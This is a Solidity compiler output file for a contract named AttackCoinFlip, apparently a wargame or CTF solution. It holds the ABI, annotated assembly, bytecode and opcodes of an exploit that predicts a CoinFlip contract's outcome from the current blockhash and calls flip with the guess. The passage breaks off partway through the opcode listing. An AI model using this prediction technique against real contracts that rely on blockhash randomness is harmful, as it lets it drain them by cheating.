{
	"CoinFlip/attackCoinFlip.sol": {
		"AttackCoinFlip": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_contract",
							"type": "address"
						}
					],
					"name": "attack",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "guessing",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "guessingValue",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"CoinFlip/attackCoinFlip.sol\":89:673  contract AttackCoinFlip{... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"CoinFlip/attackCoinFlip.sol\":89:673  contract AttackCoinFlip{... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x3fe6dd29\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x79e41b39\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xd018db3e\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"CoinFlip/attackCoinFlip.sol\":152:180  uint256 public guessingValue */\n    tag_3:\n      tag_6\n      tag_7\n      jump\t// in\n    tag_6:\n      mload(0x40)\n      tag_8\n      swap2\n      swap1\n      tag_9\n      jump\t// in\n    tag_8:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"CoinFlip/attackCoinFlip.sol\":187:207  bool public guessing */\n    tag_4:\n      tag_10\n      tag_11\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      tag_12\n      swap2\n      swap1\n      tag_13\n      jump\t// in\n    tag_12:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"CoinFlip/attackCoinFlip.sol\":216:664  function attack(address _contract) public returns(bool) {... */\n    tag_5:\n      tag_14\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_15\n      swap2\n      swap1\n      tag_16\n      jump\t// in\n    tag_15:\n      tag_17\n      jump\t// in\n    tag_14:\n      mload(0x40)\n      tag_18\n      swap2\n      swap1\n      tag_13\n      jump\t// in\n    tag_18:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"CoinFlip/attackCoinFlip.sol\":152:180  uint256 public guessingValue */\n    tag_7:\n      sload(0x00)\n      dup2\n      jump\t// out\n        /* \"CoinFlip/attackCoinFlip.sol\":187:207  bool public guessing */\n    tag_11:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n      dup2\n      jump\t// out\n        /* \"CoinFlip/attackCoinFlip.sol\":216:664  function attack(address _contract) public returns(bool) {... */\n    tag_17:\n        /* \"CoinFlip/attackCoinFlip.sol\":266:270  bool */\n      0x00\n        /* \"CoinFlip/attackCoinFlip.sol\":283:303  uint256 tmpOfCurrent */\n      dup1\n        /* \"CoinFlip/attackCoinFlip.sol\":324:336  block.number */\n      number\n        /* \"CoinFlip/attackCoinFlip.sol\":314:337  blockhash(block.number) */\n      blockhash\n        /* \"CoinFlip/attackCoinFlip.sol\":306:338  uint256(blockhash(block.number)) */\n      0x00\n      shr\n        /* \"CoinFlip/attackCoinFlip.sol\":283:338  uint256 tmpOfCurrent = uint256(blockhash(block.number)) */\n      swap1\n      pop\n        /* \"CoinFlip/attackCoinFlip.sol\":365:460  tmpOfCurrent.div(57896044618658097711785492504343953926634992332820282019728792003956564819968) */\n      tag_20\n        /* \"CoinFlip/attackCoinFlip.sol\":382:459  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n      0x8000000000000000000000000000000000000000000000000000000000000000\n        /* \"CoinFlip/attackCoinFlip.sol\":365:377  tmpOfCurrent */\n      dup3\n        /* \"CoinFlip/attackCoinFlip.sol\":365:381  tmpOfCurrent.div */\n      tag_21\n      swap1\n        /* \"CoinFlip/attackCoinFlip.sol\":365:460  tmpOfCurrent.div(57896044618658097711785492504343953926634992332820282019728792003956564819968) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_20:\n        /* \"CoinFlip/attackCoinFlip.sol\":349:362  guessingValue */\n      0x00\n        /* \"CoinFlip/attackCoinFlip.sol\":349:460  guessingValue = tmpOfCurrent.div(57896044618658097711785492504343953926634992332820282019728792003956564819968) */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"CoinFlip/attackCoinFlip.sol\":503:504  1 */\n      0x01\n        /* \"CoinFlip/attackCoinFlip.sol\":486:499  guessingValue */\n      sload(0x00)\n        /* \"CoinFlip/attackCoinFlip.sol\":486:504  guessingValue == 1 */\n      eq\n        /* \"CoinFlip/attackCoinFlip.sol\":486:519  guessingValue == 1 ? true : false */\n      tag_22\n      jumpi\n        /* \"CoinFlip/attackCoinFlip.sol\":514:519  false */\n      0x00\n        /* \"CoinFlip/attackCoinFlip.sol\":486:519  guessingValue == 1 ? true : false */\n      jump(tag_23)\n    tag_22:\n        /* \"CoinFlip/attackCoinFlip.sol\":507:511  true */\n      0x01\n        /* \"CoinFlip/attackCoinFlip.sol\":486:519  guessingValue == 1 ? true : false */\n    tag_23:\n        /* \"CoinFlip/attackCoinFlip.sol\":475:483  guessing */\n      0x01\n      0x00\n        /* \"CoinFlip/attackCoinFlip.sol\":475:519  guessing = guessingValue == 1 ? true : false */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"CoinFlip/attackCoinFlip.sol\":534:545  bool result */\n      0x00\n        /* \"CoinFlip/attackCoinFlip.sol\":564:574  CoinFlip C */\n      dup1\n        /* \"CoinFlip/attackCoinFlip.sol\":586:595  _contract */\n      dup5\n        /* \"CoinFlip/attackCoinFlip.sol\":564:596  CoinFlip C = CoinFlip(_contract) */\n      swap1\n      pop\n        /* \"CoinFlip/attackCoinFlip.sol\":616:617  C */\n      dup1\n        /* \"CoinFlip/attackCoinFlip.sol\":616:622  C.flip */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d263f67\n        /* \"CoinFlip/attackCoinFlip.sol\":623:631  guessing */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"CoinFlip/attackCoinFlip.sol\":616:632  C.flip(guessing) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_24\n      swap2\n      swap1\n      tag_13\n      jump\t// in\n    tag_24:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_26\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_26:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_27\n      swap2\n      swap1\n      tag_28\n      jump\t// in\n    tag_27:\n        /* \"CoinFlip/attackCoinFlip.sol\":607:632  result = C.flip(guessing) */\n      swap2\n      pop\n        /* \"CoinFlip/attackCoinFlip.sol\":650:656  result */\n      dup2\n        /* \"CoinFlip/attackCoinFlip.sol\":643:656  return result */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"CoinFlip/attackCoinFlip.sol\":216:664  function attack(address _contract) public returns(bool) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"Fallback/SafeMath.sol\":3969:4067  function div(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_21:\n        /* \"Fallback/SafeMath.sol\":4027:4034  uint256 */\n      0x00\n        /* \"Fallback/SafeMath.sol\":4058:4059  b */\n      dup2\n        /* \"Fallback/SafeMath.sol\":4054:4055  a */\n      dup4\n        /* \"Fallback/SafeMath.sol\":4054:4059  a / b */\n      tag_30\n      swap2\n      swap1\n      tag_31\n      jump\t// in\n    tag_30:\n        /* \"Fallback/SafeMath.sol\":4047:4059  return a / b */\n      swap1\n      pop\n        /* \"Fallback/SafeMath.sol\":3969:4067  function div(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:84   */\n    tag_32:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":73:78   */\n      dup2\n        /* \"#utility.yul\":62:78   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:84   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":90:208   */\n    tag_33:\n        /* \"#utility.yul\":177:201   */\n      tag_50\n        /* \"#utility.yul\":195:200   */\n      dup2\n        /* \"#utility.yul\":177:201   */\n      tag_32\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":172:175   */\n      dup3\n        /* \"#utility.yul\":165:202   */\n      mstore\n        /* \"#utility.yul\":90:208   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":214:436   */\n    tag_9:\n        /* \"#utility.yul\":307:311   */\n      0x00\n        /* \"#utility.yul\":345:347   */\n      0x20\n        /* \"#utility.yul\":334:343   */\n      dup3\n        /* \"#utility.yul\":330:348   */\n      add\n        /* \"#utility.yul\":322:348   */\n      swap1\n      pop\n        /* \"#utility.yul\":358:429   */\n      tag_52\n        /* \"#utility.yul\":426:427   */\n      0x00\n        /* \"#utility.yul\":415:424   */\n      dup4\n        /* \"#utility.yul\":411:428   */\n      add\n        /* \"#utility.yul\":402:408   */\n      dup5\n        /* \"#utility.yul\":358:429   */\n      tag_33\n      jump\t// in\n    tag_52:\n        /* \"#utility.yul\":214:436   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":442:532   */\n    tag_34:\n        /* \"#utility.yul\":476:483   */\n      0x00\n        /* \"#utility.yul\":519:524   */\n      dup2\n        /* \"#utility.yul\":512:525   */\n      iszero\n        /* \"#utility.yul\":505:526   */\n      iszero\n        /* \"#utility.yul\":494:526   */\n      swap1\n      pop\n        /* \"#utility.yul\":442:532   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":538:647   */\n    tag_35:\n        /* \"#utility.yul\":619:640   */\n      tag_55\n        /* \"#utility.yul\":634:639   */\n      dup2\n        /* \"#utility.yul\":619:640   */\n      tag_34\n      jump\t// in\n    tag_55:\n        /* \"#utility.yul\":614:617   */\n      dup3\n        /* \"#utility.yul\":607:641   */\n      mstore\n        /* \"#utility.yul\":538:647   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":653:863   */\n    tag_13:\n        /* \"#utility.yul\":740:744   */\n      0x00\n        /* \"#utility.yul\":778:780   */\n      0x20\n        /* \"#utility.yul\":767:776   */\n      dup3\n        /* \"#utility.yul\":763:781   */\n      add\n        /* \"#utility.yul\":755:781   */\n      swap1\n      pop\n        /* \"#utility.yul\":791:856   */\n      tag_57\n        /* \"#utility.yul\":853:854   */\n      0x00\n        /* \"#utility.yul\":842:851   */\n      dup4\n        /* \"#utility.yul\":838:855   */\n      add\n        /* \"#utility.yul\":829:835   */\n      dup5\n        /* \"#utility.yul\":791:856   */\n      tag_35\n      jump\t// in\n    tag_57:\n        /* \"#utility.yul\":653:863   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":950:1067   */\n    tag_37:\n        /* \"#utility.yul\":1059:1060   */\n      0x00\n        /* \"#utility.yul\":1056:1057   */\n      dup1\n        /* \"#utility.yul\":1049:1061   */\n      revert\n        /* \"#utility.yul\":1196:1322   */\n    tag_39:\n        /* \"#utility.yul\":1233:1240   */\n      0x00\n        /* \"#utility.yul\":1273:1315   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1266:1271   */\n      dup3\n        /* \"#utility.yul\":1262:1316   */\n      and\n        /* \"#utility.yul\":1251:1316   */\n      swap1\n      pop\n        /* \"#utility.yul\":1196:1322   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1328:1424   */\n    tag_40:\n        /* \"#utility.yul\":1365:1372   */\n      0x00\n        /* \"#utility.yul\":1394:1418   */\n      tag_63\n        /* \"#utility.yul\":1412:1417   */\n      dup3\n        /* \"#utility.yul\":1394:1418   */\n      tag_39\n      jump\t// in\n    tag_63:\n        /* \"#utility.yul\":1383:1418   */\n      swap1\n      pop\n        /* \"#utility.yul\":1328:1424   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1430:1552   */\n    tag_41:\n        /* \"#utility.yul\":1503:1527   */\n      tag_65\n        /* \"#utility.yul\":1521:1526   */\n      dup2\n        /* \"#utility.yul\":1503:1527   */\n      tag_40\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":1496:1501   */\n      dup2\n        /* \"#utility.yul\":1493:1528   */\n      eq\n        /* \"#utility.yul\":1483:1546   */\n      tag_66\n      jumpi\n        /* \"#utility.yul\":1542:1543   */\n      0x00\n        /* \"#utility.yul\":1539:1540   */\n      dup1\n        /* \"#utility.yul\":1532:1544   */\n      revert\n        /* \"#utility.yul\":1483:1546   */\n    tag_66:\n        /* \"#utility.yul\":1430:1552   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1558:1697   */\n    tag_42:\n        /* \"#utility.yul\":1604:1609   */\n      0x00\n        /* \"#utility.yul\":1642:1648   */\n      dup2\n        /* \"#utility.yul\":1629:1649   */\n      calldataload\n        /* \"#utility.yul\":1620:1649   */\n      swap1\n      pop\n        /* \"#utility.yul\":1658:1691   */\n      tag_68\n        /* \"#utility.yul\":1685:1690   */\n      dup2\n        /* \"#utility.yul\":1658:1691   */\n      tag_41\n      jump\t// in\n    tag_68:\n        /* \"#utility.yul\":1558:1697   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1703:2032   */\n    tag_16:\n        /* \"#utility.yul\":1762:1768   */\n      0x00\n        /* \"#utility.yul\":1811:1813   */\n      0x20\n        /* \"#utility.yul\":1799:1808   */\n      dup3\n        /* \"#utility.yul\":1790:1797   */\n      dup5\n        /* \"#utility.yul\":1786:1809   */\n      sub\n        /* \"#utility.yul\":1782:1814   */\n      slt\n        /* \"#utility.yul\":1779:1898   */\n      iszero\n      tag_70\n      jumpi\n        /* \"#utility.yul\":1817:1896   */\n      tag_71\n      tag_37\n      jump\t// in\n    tag_71:\n        /* \"#utility.yul\":1779:1898   */\n    tag_70:\n        /* \"#utility.yul\":1937:1938   */\n      0x00\n        /* \"#utility.yul\":1962:2015   */\n      tag_72\n        /* \"#utility.yul\":2007:2014   */\n      dup5\n        /* \"#utility.yul\":1998:2004   */\n      dup3\n        /* \"#utility.yul\":1987:1996   */\n      dup6\n        /* \"#utility.yul\":1983:2005   */\n      add\n        /* \"#utility.yul\":1962:2015   */\n      tag_42\n      jump\t// in\n    tag_72:\n        /* \"#utility.yul\":1952:2015   */\n      swap2\n      pop\n        /* \"#utility.yul\":1908:2025   */\n      pop\n        /* \"#utility.yul\":1703:2032   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2038:2154   */\n    tag_43:\n        /* \"#utility.yul\":2108:2129   */\n      tag_74\n        /* \"#utility.yul\":2123:2128   */\n      dup2\n        /* \"#utility.yul\":2108:2129   */\n      tag_34\n      jump\t// in\n    tag_74:\n        /* \"#utility.yul\":2101:2106   */\n      dup2\n        /* \"#utility.yul\":2098:2130   */\n      eq\n        /* \"#utility.yul\":2088:2148   */\n      tag_75\n      jumpi\n        /* \"#utility.yul\":2144:2145   */\n      0x00\n        /* \"#utility.yul\":2141:2142   */\n      dup1\n        /* \"#utility.yul\":2134:2146   */\n      revert\n        /* \"#utility.yul\":2088:2148   */\n    tag_75:\n        /* \"#utility.yul\":2038:2154   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2160:2297   */\n    tag_44:\n        /* \"#utility.yul\":2214:2219   */\n      0x00\n        /* \"#utility.yul\":2245:2251   */\n      dup2\n        /* \"#utility.yul\":2239:2252   */\n      mload\n        /* \"#utility.yul\":2230:2252   */\n      swap1\n      pop\n        /* \"#utility.yul\":2261:2291   */\n      tag_77\n        /* \"#utility.yul\":2285:2290   */\n      dup2\n        /* \"#utility.yul\":2261:2291   */\n      tag_43\n      jump\t// in\n    tag_77:\n        /* \"#utility.yul\":2160:2297   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2303:2648   */\n    tag_28:\n        /* \"#utility.yul\":2370:2376   */\n      0x00\n        /* \"#utility.yul\":2419:2421   */\n      0x20\n        /* \"#utility.yul\":2407:2416   */\n      dup3\n        /* \"#utility.yul\":2398:2405   */\n      dup5\n        /* \"#utility.yul\":2394:2417   */\n      sub\n        /* \"#utility.yul\":2390:2422   */\n      slt\n        /* \"#utility.yul\":2387:2506   */\n      iszero\n      tag_79\n      jumpi\n        /* \"#utility.yul\":2425:2504   */\n      tag_80\n      tag_37\n      jump\t// in\n    tag_80:\n        /* \"#utility.yul\":2387:2506   */\n    tag_79:\n        /* \"#utility.yul\":2545:2546   */\n      0x00\n        /* \"#utility.yul\":2570:2631   */\n      tag_81\n        /* \"#utility.yul\":2623:2630   */\n      dup5\n        /* \"#utility.yul\":2614:2620   */\n      dup3\n        /* \"#utility.yul\":2603:2612   */\n      dup6\n        /* \"#utility.yul\":2599:2621   */\n      add\n        /* \"#utility.yul\":2570:2631   */\n      tag_44\n      jump\t// in\n    tag_81:\n        /* \"#utility.yul\":2560:2631   */\n      swap2\n      pop\n        /* \"#utility.yul\":2516:2641   */\n      pop\n        /* \"#utility.yul\":2303:2648   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2654:2834   */\n    tag_45:\n        /* \"#utility.yul\":2702:2779   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2699:2700   */\n      0x00\n        /* \"#utility.yul\":2692:2780   */\n      mstore\n        /* \"#utility.yul\":2799:2803   */\n      0x12\n        /* \"#utility.yul\":2796:2797   */\n      0x04\n        /* \"#utility.yul\":2789:2804   */\n      mstore\n        /* \"#utility.yul\":2823:2827   */\n      0x24\n        /* \"#utility.yul\":2820:2821   */\n      0x00\n        /* \"#utility.yul\":2813:2828   */\n      revert\n        /* \"#utility.yul\":3026:3211   */\n    tag_31:\n        /* \"#utility.yul\":3066:3067   */\n      0x00\n        /* \"#utility.yul\":3083:3103   */\n      tag_85\n        /* \"#utility.yul\":3101:3102   */\n      dup3\n        /* \"#utility.yul\":3083:3103   */\n      tag_32\n      jump\t// in\n    tag_85:\n        /* \"#utility.yul\":3078:3103   */\n      swap2\n      pop\n        /* \"#utility.yul\":3117:3137   */\n      tag_86\n        /* \"#utility.yul\":3135:3136   */\n      dup4\n        /* \"#utility.yul\":3117:3137   */\n      tag_32\n      jump\t// in\n    tag_86:\n        /* \"#utility.yul\":3112:3137   */\n      swap3\n      pop\n        /* \"#utility.yul\":3156:3157   */\n      dup3\n        /* \"#utility.yul\":3146:3181   */\n      tag_87\n      jumpi\n        /* \"#utility.yul\":3161:3179   */\n      tag_88\n      tag_45\n      jump\t// in\n    tag_88:\n        /* \"#utility.yul\":3146:3181   */\n    tag_87:\n        /* \"#utility.yul\":3203:3204   */\n      dup3\n        /* \"#utility.yul\":3200:3201   */\n      dup3\n        /* \"#utility.yul\":3196:3205   */\n      div\n        /* \"#utility.yul\":3191:3205   */\n      swap1\n      pop\n        /* \"#utility.yul\":3026:3211   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220e827417f1a4a571ddebb4359014a6f54cc9b0c0e95fb807172f37979f73689f764736f6c634300080d0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b506103d8806100206000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c80633fe6dd291461004657806379e41b3914610064578063d018db3e14610082575b600080fd5b61004e6100b2565b60405161005b9190610208565b60405180910390f35b61006c6100b8565b604051610079919061023e565b60405180910390f35b61009c600480360381019061009791906102bc565b6100cb565b6040516100a9919061023e565b60405180910390f35b60005481565b600160009054906101000a900460ff1681565b600080434060001c90506101087f8000000000000000000000000000000000000000000000000000000000000000826101d990919063ffffffff16565b60008190555060016000541461011f576000610122565b60015b600160006101000a81548160ff0219169083151502179055506000808490508073ffffffffffffffffffffffffffffffffffffffff16631d263f67600160009054906101000a900460ff166040518263ffffffff1660e01b8152600401610189919061023e565b6020604051808303816000875af11580156101a8573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101cc9190610315565b9150819350505050919050565b600081836101e79190610371565b905092915050565b6000819050919050565b610202816101ef565b82525050565b600060208201905061021d60008301846101f9565b92915050565b60008115159050919050565b61023881610223565b82525050565b6000602082019050610253600083018461022f565b92915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006102898261025e565b9050919050565b6102998161027e565b81146102a457600080fd5b50565b6000813590506102b681610290565b92915050565b6000602082840312156102d2576102d1610259565b5b60006102e0848285016102a7565b91505092915050565b6102f281610223565b81146102fd57600080fd5b50565b60008151905061030f816102e9565b92915050565b60006020828403121561032b5761032a610259565b5b600061033984828501610300565b91505092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061037c826101ef565b9150610387836101ef565b92508261039757610396610342565b5b82820490509291505056fea2646970667358221220e827417f1a4a571ddebb4359014a6f54cc9b0c0e95fb807172f37979f73689f764736f6c634300080d0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x3D8 DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x3FE6DD29 EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x79E41B39 EQ PUSH2 0x64 JUMPI DUP1 PUSH4 0xD018DB3E EQ PUSH2 0x82 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4E PUSH2 0xB2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x5B SWAP2 SWAP1 PUSH2 0x208 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x6C PUSH2 0xB8 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x79 SWAP2 SWAP1 PUSH2 0x23E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x9C PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x97 SWAP2 SWAP1 PUSH2 0x2BC JUMP JUMPDEST PUSH2 0xCB JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xA9 SWAP2 SWAP1 PUSH2 0x23E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 NUMBER BLOCKHASH PUSH1 0x0 SHR SWAP1 POP PUSH2 0x108 PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 DUP3 PUSH2 0x1D9 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 SSTORE POP PUSH1 0x1 PUSH1 0x0 SLOAD EQ PUSH2 0x11F JUMPI PUSH1 0x0 PUSH2 0x122 JUMP JUMPDEST PUSH1 0x1 JUMPDEST PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH1 0x0 DUP1 DUP5 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x189 SWAP2 SWAP1 PUSH2 0x23E JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1A8 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1CC SWAP2 SWAP1 PUSH2 0x315 JUMP JUMPDEST SWAP2 POP DUP2 SWAP4 POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 DUP4 PUSH2 0x1E7 SWAP2 SWAP1 PUSH2 0x371 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x202 DUP2 PUSH2 0x1EF JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x21D PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1F9 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x238 DUP2 PUSH2 0x223 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x253 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x22F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x289 DUP3 PUSH2 0x25E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x299 DUP2 PUSH2 0x27E JUMP JUMPDEST DUP2 EQ PUSH2 0x2A4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x2B6 DUP2 PUSH2 0x290 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2D2 JUMPI PUSH2 0x2D1 PUSH2 0x259 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x2E0 DUP5 DUP3 DUP6 ADD PUSH2 0x2A7 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x2F2 DUP2 PUSH2 0x223 JUMP JUMPDEST DUP2 EQ PUSH2 0x2FD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x30F DUP2 PUSH2 0x2E9 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x32B JUMPI PUSH2 0x32A PUSH2 0x259 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x339 DUP5 DUP3 DUP6 ADD PUSH2 0x300 JUMP JUMPDEST 